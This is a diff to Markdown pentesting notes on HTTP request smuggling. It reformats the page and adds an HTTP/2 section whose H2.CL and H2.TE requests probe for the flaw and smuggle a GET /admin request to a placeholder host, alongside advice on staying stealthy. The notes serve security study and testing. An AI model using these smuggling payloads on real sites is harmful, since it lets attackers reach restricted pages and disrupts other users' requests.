@@ -8,17 +8,11 @@
 
 * HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.
 
-<!---->
-
-* Request smuggling is associated to HTTP/1 requests but can also affect HTTP/2-supported websites based on their backend structure.
-
-<!---->
+- Request smuggling is associated to HTTP/1 requests but can also affect HTTP/2-supported websites based on their backend structure.
 
 * Modern web apps often use chains of HTTP servers, with users sending requests to a front-end server (sometimes referred to as a load balancer or reverse proxy), which in turn forwards requests to multiple back-end servers.
 
-<!---->
-
-* Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit
+- Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit
 
 </details>
 
@@ -92,9 +86,7 @@ The back-end server, relying on the Content-Length header, waits for additional 
 **Warning**: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
 {% endhint %}
 
-## <mark style="color:yellow;">Confirmation</mark>
-
-### <mark style="color:yellow;">**CL.TE**</mark>
+## <mark style="color:yellow;">Confirmation/Exploitation</mark>
 
 Normal request
 
@@ -107,7 +99,7 @@ Content-Length: 11
 q=smuggling
 ```
 
-Attack request
+### <mark style="color:yellow;">**CL.TE**</mark>
 
 ```http
 POST /search HTTP/1.1
@@ -331,3 +323,58 @@ Foo: X
 ## <mark style="color:yellow;">Content-Length in the smuggled request</mark>
 
 The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.
+
+## <mark style="color:yellow;">HTTP/2 request smuggling</mark>
+
+**HTTP/2 downgrading**
+
+HTTP/2 downgrading converts HTTP/2 requests into HTTP/1 syntax, allowing web servers and proxies to support HTTP/2 clients while communicating with HTTP/1 back-end servers.
+
+## <mark style="color:yellow;">Identification</mark>
+
+### <mark style="color:yellow;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>
+
+```http
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /404 HTTP/1.1
+Foo: x 
+```
+
+Then send another request. In this way the second one will get `/404` .
+
+### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
+
+```http
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Foo: x
+```
+
+## <mark style="color:yellow;">Exploitation</mark>
+
+### <mark style="color:yellow;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>
+
+```http
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 5
+
+x=1
+```
+
+
+
